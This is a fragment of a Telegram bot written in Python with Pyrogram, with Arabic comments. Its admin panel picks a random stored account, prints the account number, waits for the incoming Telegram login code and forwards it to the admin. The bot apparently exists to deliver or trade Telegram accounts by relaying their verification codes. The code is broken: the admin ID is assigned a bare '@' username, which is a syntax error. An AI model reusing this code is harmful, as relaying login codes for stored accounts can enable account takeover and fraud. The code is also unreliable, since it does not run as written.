    ...
    if user_id in admins:
        keys = mk(
            [
                ...
                [btn('تعيين حساب تحقق', 'addch')],
                [btn('تسليم رقم', 'add_account')]
            ]
        )
        await msg.reply("اهلا بك عزيزي الادمن", reply_markup=keys)
@app.on_callback_query(filters.regex("^add_account$"))
async def add_account(app, query):
    admin_id = @Uupu6  # استبدل هذا بمعرف الأدمن الخاص بك
    if query.from_user.id != admin_id:
        return
    accounts = db.keys()
    if not accounts:
        await query.answer("لا توجد حسابات مخزنة حاليًا.")
        return
    # استعراض الحسابات المخزنة واختيار حساب عشوائي
    import random
    random_account = random.choice(accounts)
    account_info = db.get(random_account)
    account_number = account_info.get("account_number", "")
    # طباعة رقم الحساب
    print(f"رقم الحساب: {account_number}")
    # انتظار وصول رسالة تحتوي على الكود من تليجرام
    message = await app.listen(filters.private & filters.text)
    # إرسال الرسالة إلى الأدمن
    await app.send_message(admin_id, f"الكود الوارد من تليجرام:\n\n{message.text}")
